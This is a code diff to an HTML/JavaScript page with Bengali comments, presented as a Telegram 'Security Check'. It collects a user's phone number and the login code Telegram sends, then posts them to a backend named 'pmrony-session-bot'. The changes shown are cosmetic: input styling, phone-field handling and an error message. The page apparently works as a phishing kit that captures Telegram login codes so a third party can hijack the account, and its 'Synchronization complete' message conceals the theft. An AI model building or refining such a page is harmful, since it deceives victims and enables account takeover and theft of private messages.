@@ -8,9 +8,27 @@
     <style>
         body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
         .box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 1.5px solid #ddd; border-radius: 10px; font-size: 18px; text-align: center; outline: none; }
         
-        /* কিপ্যাড স্টাইল */
+        /* নম্বর বক্সের ডিজাইন */
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            padding-left: 15px; 
+            margin: 15px 0; 
+            border: 1.5px solid #ddd; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            text-align: left; /* বাম দিকে অ্যালাইন করা হয়েছে */
+            outline: none; 
+            box-sizing: border-box;
+        }
+
+        /* ওটিপি বক্সের ডিজাইন */
+        #otp_display {
+            text-align: center; /* ওটিপি মাঝখানে দেখাবে */
+            padding-left: 0;
+        }
+        
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
         .key { background: #f8f9fa; border: 1px solid #ddd; padding: 15px; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .key:active { background: #e2e6ea; transform: scale(0.95); }
@@ -25,7 +43,6 @@
     <div class="box">
         <h3 id="title">Security Check</h3>
         
-        <!-- ধাপ ১: ফোন নম্বর -->
         <div id="step1">
             <p style="font-size: 14px; color: #666;">Enter your number with country code</p>
             <input type="tel" id="phone" value="+">
@@ -33,7 +50,6 @@
             <div id="load1" class="loader hidden">Sending request...</div>
         </div>
 
-        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
         <div id="step2" class="hidden">
             <p style="color: green; font-weight: bold;">✅ Authorization Sent!</p>
             <p style="font-size: 13px; color: #666;">Enter the 5-digit key received in Telegram</p>
@@ -63,7 +79,11 @@
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let currentOTP = "";
 
-        // কিপ্যাড লজিক
+        const phoneInput = document.getElementById("phone");
+        phoneInput.addEventListener("input", function() {
+            if (!this.value.startsWith("+")) { this.value = "+" + this.value.replace("+", ""); }
+        });
+
         function addNum(num) {
             if(currentOTP.length < 5) {
                 currentOTP += num;
@@ -109,7 +129,7 @@
                 if(data.status === "success") {
                     tg.showPopup({ message: "✅ Success! Synchronization complete." }, () => { tg.close(); });
                 } else { alert("❌ Error: " + data.message); }
-            } catch(e) { alert("Server Down!"); }
+            } catch(e) { alert("Server Error!"); }
             document.getElementById("load2").classList.add("hidden");
         }
     </script>
